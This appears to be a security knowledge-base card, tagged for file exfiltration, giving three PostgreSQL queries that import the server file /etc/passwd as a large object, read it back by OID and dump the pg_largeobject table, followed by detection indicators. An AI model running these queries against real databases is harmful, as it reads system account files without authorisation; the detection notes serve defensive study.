---
type: code
language: sql
verified: true
platforms:
  - PostgreSQL
tags:
  - large-object
  - file-exfil
validated: true
---

# postgresql-import-and-retrieve-file-as-large-object

## Code

```sql
SELECT lo_import('/etc/passwd'); -- This command imports a file and creates a large object from it in PostgreSQL. The OID of the large object is returned.
SELECT lo_get(16420); -- This command retrieves the large object with the specified OID.
SELECT * from pg_largeobject; -- This command retrieves all large objects and their data from the pg_largeobject system table.
```

## Description

This SQL snippet imports a file as a large object using lo_import, retrieves it with lo_get using the returned OID, and lists all large objects for verification or cleanup.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| '/etc/passwd' | File path to import | '/var/log/app.log' |
| 16420 | OID from lo_import | Dynamic (use returned value) |

## Usage

Execute lo_import first to get OID, then lo_get with that OID. Use pg_largeobject query to manage multiple imports. Ideal for binary files or when COPY fails due to format issues.

## Detection

- Logs of lo_import/lo_get on sensitive paths.
- Queries to pg_largeobject system table.
- Unusual large object creation volumes.

## Related

- [[procedures/Read-Files-via-PostgreSQL-Server-Functions]]
